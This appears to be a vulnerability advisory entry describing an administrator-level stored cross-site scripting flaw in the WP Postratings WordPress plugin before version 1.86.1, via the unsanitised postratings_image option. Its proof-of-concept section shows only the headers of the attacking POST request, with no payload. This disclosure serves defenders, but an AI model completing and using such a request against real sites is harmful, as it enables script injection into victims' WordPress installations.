## WordPress Plugin Vulnerabilities

# WP Postratings < 1.86.1 - Admin+ Stored Cross-Site Scripting

### Description

The plugin does not sanitise the postratings\_image parameter from its options page (wp-admin/admin.php?page=wp-postratings/postratings-options.php). Even though the page is only accessible to administrators, and protected against CSRF attacks, the issue is still exploitable when the unfiltered\_html capability is disabled.

### Proof of Concept

POST /wp-admin/admin.php?page=wp-postratings/postratings-options.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1954
Connection: close
Cookie: [admin cookies]
Upgrade-Insecure-Requests: 1
